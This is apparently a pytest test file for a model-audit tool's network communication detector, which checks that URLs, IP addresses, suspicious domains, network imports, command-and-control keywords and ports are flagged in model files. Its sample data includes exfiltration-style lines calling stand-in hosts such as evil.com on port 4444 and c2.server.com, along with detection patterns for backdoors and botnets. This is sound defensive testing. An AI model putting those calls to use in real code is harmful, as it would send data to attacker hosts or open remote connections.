"""Tests for network communication detection."""

from modelaudit.network_comm_detector import NetworkCommDetector, detect_network_communication


class TestNetworkCommDetector:
    """Test the NetworkCommDetector class."""

    def test_detect_urls(self):
        """Test detection of URLs in binary data."""
        detector = NetworkCommDetector()

        # Test HTTP and HTTPS URLs
        data = b"""
        Some model data
        http://example.com/download
        https://malware.net/payload
        ftp://badserver.com/upload
        """

        findings = detector.scan(data, "test_model.pkl")

        # Should find at least 3 URLs
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        assert len(url_findings) >= 3

        # Check specific URLs are detected
        urls = [f["url"] for f in url_findings]
        assert any("example.com" in url for url in urls)
        assert any("malware.net" in url for url in urls)

    def test_detect_ipv4_addresses(self):
        """Test detection of IPv4 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        192.168.1.1
        10.0.0.1
        8.8.8.8
        172.16.0.1
        """

        findings = detector.scan(data)
        ipv4_findings = [f for f in findings if f["type"] == "ipv4_address"]

        assert len(ipv4_findings) == 4

        # Check private vs public classification
        private_ips = [f for f in ipv4_findings if f.get("is_private")]
        public_ips = [f for f in ipv4_findings if f.get("is_global")]

        assert len(private_ips) == 3  # 192.168, 10.0, 172.16
        assert len(public_ips) == 1  # 8.8.8.8

    def test_detect_ipv6_addresses(self):
        """Test detection of IPv6 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        2001:0db8:85a3:0000:0000:8a2e:0370:7334
        fe80:0000:0000:0000:0202:b3ff:fe1e:8329
        """

        findings = detector.scan(data)
        ipv6_findings = [f for f in findings if f["type"] == "ipv6_address"]

        assert len(ipv6_findings) == 2

    def test_detect_domain_names(self):
        """Test detection of domain names."""
        detector = NetworkCommDetector()

        data = b"""
        connect to api.example.com
        download from cdn.badsite.tk
        upload to data-exfil.ml
        """

        findings = detector.scan(data)
        domain_findings = [f for f in findings if f["type"] == "domain_name"]

        assert len(domain_findings) >= 2  # Should detect suspicious TLDs

        # Check suspicious TLD detection
        suspicious = [f for f in domain_findings if f["confidence"] > 0.6]
        assert len(suspicious) >= 2  # .tk and .ml are suspicious

    def test_detect_network_libraries(self):
        """Test detection of network library imports."""
        detector = NetworkCommDetector()

        data = b"""
        import socket
        from urllib import request
        import requests
        from paramiko import SSHClient
        """

        findings = detector.scan(data)
        lib_findings = [f for f in findings if f["type"] == "network_library"]

        assert len(lib_findings) >= 4

        # Check specific libraries
        libs = [f["library"] for f in lib_findings]
        assert "socket" in libs
        assert "urllib" in libs
        assert "requests" in libs
        assert "paramiko" in libs

        # Check severity levels
        critical = [f for f in lib_findings if f["severity"] == "CRITICAL"]
        assert len(critical) >= 2  # socket and paramiko are critical

    def test_detect_network_functions(self):
        """Test detection of network function calls."""
        detector = NetworkCommDetector()

        data = b"""
        socket.connect(('evil.com', 4444))
        requests.post('http://c2.server.com/data', payload)
        urlopen('https://exfiltrate.net')
        ftp.connect('upload.server.com')
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) >= 4

        # Check specific functions
        funcs = [f["function"] for f in func_findings]
        assert "socket.connect" in funcs
        assert "requests.post" in funcs
        assert "urlopen" in funcs

    def test_detect_cc_patterns(self):
        """Test detection of command & control patterns."""
        detector = NetworkCommDetector()

        data = b"""
        beacon_url = "http://c2.server.com"
        callback_url = config['server']
        malware_config = {"backdoor": True}
        botnet_id = "zombie123"
        """

        findings = detector.scan(data)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]

        assert len(cc_findings) >= 4

        # All C&C patterns should be critical
        assert all(f["severity"] == "CRITICAL" for f in cc_findings)

        # Check specific patterns
        patterns = [f["pattern"] for f in cc_findings]
        assert "beacon_url" in patterns
        assert "malware" in patterns
        assert "backdoor" in patterns
        assert "botnet" in patterns

    def test_detect_suspicious_ports(self):
        """Test detection of suspicious port numbers."""
        detector = NetworkCommDetector()

        data = b"""
        connect to server:1337
        ssh port=22
        PORT=4444
        redis:6379
        """

        findings = detector.scan(data)
        port_findings = [f for f in findings if f["type"] == "suspicious_port"]

        assert len(port_findings) >= 4

        # Check specific ports
        ports = [f["port"] for f in port_findings]
        assert 1337 in ports  # Common backdoor
        assert 22 in ports  # SSH
        assert 4444 in ports  # Metasploit
        assert 6379 in ports  # Redis

    def test_suspicious_port_scan_performance(self):
        """Ensure port scanning remains performant with precompiled patterns."""
        detector = NetworkCommDetector()
        data = b"connect to server:1337" * 100
        context = "model.bin"

        import os
        import time

        start = time.perf_counter()
        # Fewer iterations in CI environments
        iterations = 20 if (os.getenv("CI") or os.getenv("GITHUB_ACTIONS")) else 50
        for _ in range(iterations):
            detector.findings = []
            detector._scan_suspicious_ports(data, context)
        duration = time.perf_counter() - start

        assert duration < 1.0

    def test_blacklist_detection(self):
        """Test detection of blacklisted domains when configured."""
        # Configure with specific blacklisted domains
        config = {"custom_blacklist": [b"malicious-site.com", b"known-c2.net", b"phishing-domain.org"]}
        detector = NetworkCommDetector(config)

        data = b"""
        http://malicious-site.com/payload
        connect to known-c2.net
        upload to phishing-domain.org
        """

        findings = detector.scan(data)
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]

        assert len(blacklist_findings) >= 3

        # Blacklisted domains should have max confidence
        assert all(f["confidence"] == 1.0 for f in blacklist_findings)
        assert all(f["severity"] == "CRITICAL" for f in blacklist_findings)

    def test_custom_config(self):
        """Test custom configuration options."""
        config = {
            "custom_cc_patterns": [b"custom_beacon", b"my_backdoor"],
            "custom_blacklist": [b"custom-evil.com", b"my-c2.net"],
        }
        detector = NetworkCommDetector(config)

        data = b"""
        custom_beacon = "http://server.com"
        my_backdoor.connect()
        http://custom-evil.com
        connect to my-c2.net
        """

        findings = detector.scan(data)

        # Check custom C&C patterns
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        patterns = [f["pattern"] for f in cc_findings]
        assert "custom_beacon" in patterns
        assert "my_backdoor" in patterns

        # Check custom blacklist
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]
        domains = [f["domain"] for f in blacklist_findings]
        assert "custom-evil.com" in domains
        assert "my-c2.net" in domains

    def test_custom_patterns_isolated_between_instances(self):
        """Ensure custom patterns and blacklists do not leak between instances."""
        config = {
            "custom_cc_patterns": ["LEAK_PATTERN"],
            "custom_blacklist": ["LEAK.example"],
        }
        detector_with_custom = NetworkCommDetector(config)
        detector_default = NetworkCommDetector()

        data = b"LEAK_PATTERN http://LEAK.example"

        findings_custom = detector_with_custom.scan(data)
        assert any(f["type"] == "cc_pattern" and f["pattern"] == "leak_pattern" for f in findings_custom)
        assert any(f["type"] == "blacklisted_domain" and f["domain"] == "leak.example" for f in findings_custom)

        findings_default = detector_default.scan(data)
        assert all(f["type"] != "cc_pattern" for f in findings_default)
        assert all(f["type"] != "blacklisted_domain" for f in findings_default)

    def test_confidence_scoring(self):
        """Test confidence scoring for different patterns."""
        detector = NetworkCommDetector()

        data = b"""
        http://normal-site.com
        http://evil-site.tk:1337/cmd
        192.168.1.1
        8.8.8.8
        malware_config = {}
        import json
        import socket
        """

        findings = detector.scan(data)

        # URL with suspicious port should have higher confidence
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        suspicious_urls = [f for f in url_findings if ":1337" in f["url"]]
        assert all(f["confidence"] >= 0.8 for f in suspicious_urls)

        # Private IPs should have lower confidence than public
        ip_findings = [f for f in findings if "ipv4" in f["type"]]
        private_ips = [f for f in ip_findings if f.get("is_private")]
        public_ips = [f for f in ip_findings if f.get("is_global")]

        if private_ips and public_ips:
            assert max(f["confidence"] for f in private_ips) < max(f["confidence"] for f in public_ips)

        # Malware patterns should have high confidence
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        malware_findings = [f for f in cc_findings if "malware" in f["pattern"]]
        assert all(f["confidence"] >= 0.95 for f in malware_findings)

    def test_no_false_positives_on_clean_data(self):
        """Test that clean model data doesn't trigger false positives."""
        detector = NetworkCommDetector()

        # Clean model data with some numbers that could look like IPs
        data = b"""
        model_weights = [1.2, 3.4, 5.6, 7.8]
        layer_sizes = [224, 224, 3]
        version = "2.0.1.1"
        optimizer = "adam"
        loss = 0.001
        """

        findings = detector.scan(data)

        # Should not detect version numbers as IPs
        ip_findings = [f for f in findings if "ip" in f["type"]]
        assert len(ip_findings) == 0

        # Should not detect any network patterns
        assert len(findings) == 0

    def test_context_extraction(self):
        """Test that context/snippets are properly extracted."""
        detector = NetworkCommDetector()

        data = b"""
        This is some context before
        socket.connect(('evil.com', 4444))
        and some context after
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) > 0

        # Check that snippet contains surrounding context
        snippet = func_findings[0].get("snippet", "")
        assert "context before" in snippet or "context after" in snippet


class TestDetectNetworkCommunication:
    """Test the convenience function."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for network patterns."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"http://malicious.com/payload")

        findings = detect_network_communication(str(test_file))
        assert len(findings) > 0
        assert any("malicious.com" in f.get("url", "") for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_network_communication("/non/existent/file.pkl")
        assert len(findings) == 1
        assert findings[0]["type"] == "error"
        assert "not found" in findings[0]["message"]

    def test_with_config(self, tmp_path):
        """Test scanning with custom configuration."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"my_custom_pattern")

        config = {"custom_cc_patterns": [b"my_custom_pattern"]}

        findings = detect_network_communication(str(test_file), config)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        assert len(cc_findings) == 1
        assert cc_findings[0]["pattern"] == "my_custom_pattern"
